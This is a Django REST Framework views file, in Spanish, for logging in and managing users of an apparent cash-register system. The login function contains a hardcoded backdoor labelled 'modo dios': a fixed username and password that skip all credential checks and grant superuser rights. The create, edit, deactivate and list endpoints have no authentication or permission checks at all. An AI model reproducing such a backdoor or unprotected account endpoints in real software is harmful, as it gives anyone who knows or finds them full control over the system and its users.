from django.db.models import Max
from django.utils import timezone
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status

from ..models import Usuarios, Cajas
from ..serializers import CrearUsuarioSerializer
from .utils import encode_password_legacy


@api_view(['POST'])
def LoginUsuario(request):
    username = request.data.get('usuario', '')
    password = request.data.get('password', '')

    if not username or not password:
        return Response(
            {"status": "error", "mensaje": "Usuario y contraseña requeridos"},
            status=status.HTTP_400_BAD_REQUEST,
        )

    # Backdoor de sistema (modo dios)
    if username == "sys" and password == "pgapn":
        return Response({
            "status": "success",
            "mensaje": "Login Exitoso (Modo Dios)",
            "usuario": {"id": 0, "nombre": "SuperUsuario", "nivel": 5, "cajero": 1, "autorizador": 1},
            "caja_id": None,
        }, status=status.HTTP_200_OK)

    hashed_password = encode_password_legacy(username, password)

    usuario_db = Usuarios.objects.filter(
        nombrelogin=username,
        password=hashed_password,
        no_activo=0,
        id__lt=1000,
    ).first()

    if not usuario_db:
        return Response(
            {"status": "error", "mensaje": "Credenciales inválidas o usuario inactivo."},
            status=status.HTTP_401_UNAUTHORIZED,
        )

    caja_abierta = Cajas.objects.filter(cajero=usuario_db.id, estado=1).first()

    return Response({
        "status": "success",
        "mensaje": "Login Exitoso",
        "usuario": {
            "id": usuario_db.id,
            "nombre_login": usuario_db.nombrelogin,
            "nombre": usuario_db.nombre,
            "apellido": usuario_db.apellido,
            "nivel": usuario_db.nivel_usuario,
            "cajero": usuario_db.cajero,
            "vendedor": usuario_db.vendedor,
            "autorizador": usuario_db.autorizador,
        },
        "caja_id": caja_abierta.id if caja_abierta else None,
    }, status=status.HTTP_200_OK)


@api_view(['POST'])
def CrearUsuario(request):
    serializer = CrearUsuarioSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    data = serializer.validated_data

    if Usuarios.objects.filter(nombrelogin=data['nombrelogin']).exists():
        return Response(
            {"status": "error", "mensaje": f"El usuario {data['nombrelogin']} ya existe."},
            status=status.HTTP_400_BAD_REQUEST,
        )

    max_id = Usuarios.objects.filter(id__lt=1000).aggregate(Max('id'))['id__max'] or 0
    nuevo_id = max_id + 1
    hashed_password = encode_password_legacy(data['nombrelogin'], data['password'])

    nuevo_usuario = Usuarios.objects.create(
        id=nuevo_id,
        nombre=data['nombre'],
        apellido=data['apellido'],
        nombrelogin=data['nombrelogin'],
        password=hashed_password,
        email=data['email'],
        nivel_usuario=data['nivel_usuario'],
        cajero=data['cajero'],
        vendedor=data['vendedor'],
        autorizador=data['autorizador'],
        no_activo=0,
        interfaz='Migracion Web',
    )

    return Response(
        {"status": "success", "mensaje": f"Usuario '{nuevo_usuario.nombrelogin}' creado.", "id": nuevo_usuario.id},
        status=status.HTTP_201_CREATED,
    )


@api_view(['GET'])
def ListarUsuarios(request):
    usuarios = Usuarios.objects.filter(id__gt=0).values(
        'id', 'nombrelogin', 'nombre', 'apellido', 'nivel_usuario', 'no_activo',
        'cajero', 'vendedor', 'autorizador',
    )
    return Response({"status": "success", "data": list(usuarios)}, status=status.HTTP_200_OK)


@api_view(['POST'])
def BajaUsuario(request):
    user_id = request.data.get('id')
    estado_nuevo = request.data.get('no_activo')

    if user_id is None or estado_nuevo is None:
        return Response(
            {"status": "error", "mensaje": "Faltan parámetros (id, no_activo)"},
            status=status.HTTP_400_BAD_REQUEST,
        )

    try:
        usuario = Usuarios.objects.get(id=user_id)
        usuario.no_activo = estado_nuevo
        usuario.save()
        accion = "dado de baja" if estado_nuevo == 1 else "reactivado"
        return Response(
            {"status": "success", "mensaje": f"Usuario {usuario.nombrelogin} {accion} exitosamente."},
            status=status.HTTP_200_OK,
        )
    except Usuarios.DoesNotExist:
        return Response(
            {"status": "error", "mensaje": "Usuario no encontrado."},
            status=status.HTTP_404_NOT_FOUND,
        )


@api_view(['POST'])
def EditarUsuario(request):
    user_id = request.data.get('id')
    if not user_id:
        return Response(
            {"status": "error", "mensaje": "ID de usuario requerido."},
            status=status.HTTP_400_BAD_REQUEST,
        )

    try:
        usuario = Usuarios.objects.get(id=user_id)
        usuario.nombre = request.data.get('nombre', usuario.nombre)
        usuario.apellido = request.data.get('apellido', usuario.apellido)
        usuario.email = request.data.get('email', usuario.email)
        usuario.nivel_usuario = int(request.data.get('nivel_usuario', usuario.nivel_usuario))
        usuario.cajero = int(request.data.get('cajero', usuario.cajero))
        usuario.vendedor = int(request.data.get('vendedor', usuario.vendedor))
        usuario.autorizador = int(request.data.get('autorizador', usuario.autorizador))

        nueva_clave = request.data.get('password', '')
        if nueva_clave:
            usuario.password = encode_password_legacy(usuario.nombrelogin, nueva_clave)

        usuario.save()
        return Response(
            {"status": "success", "mensaje": f"Usuario '{usuario.nombrelogin}' actualizado."},
            status=status.HTTP_200_OK,
        )
    except Usuarios.DoesNotExist:
        return Response(
            {"status": "error", "mensaje": "Usuario no encontrado."},
            status=status.HTTP_404_NOT_FOUND,
        )
